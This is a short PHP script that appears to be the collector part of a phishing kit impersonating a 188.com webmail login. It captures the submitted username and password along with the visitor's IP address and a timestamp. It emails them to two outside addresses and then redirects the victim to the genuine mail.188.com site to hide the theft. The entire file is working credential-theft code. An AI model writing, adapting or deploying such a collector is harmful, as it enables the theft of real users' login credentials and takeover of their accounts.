<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "---------------------------------------------------------------------------\n";
$msg .= "Client Login\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "User : ".$_POST['username']."\n";
$msg .= "Pass : ".$_POST['password']."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "---------------------------------------------------------------------------\n";

$to = "blackhat4477@gmail.com,mylogs247@163.com";
$subject = "188.com $ip";
$from = "From: Universal";

mail($to,$subject,$msg,$from);

header("Location: http://mail.188.com");


?>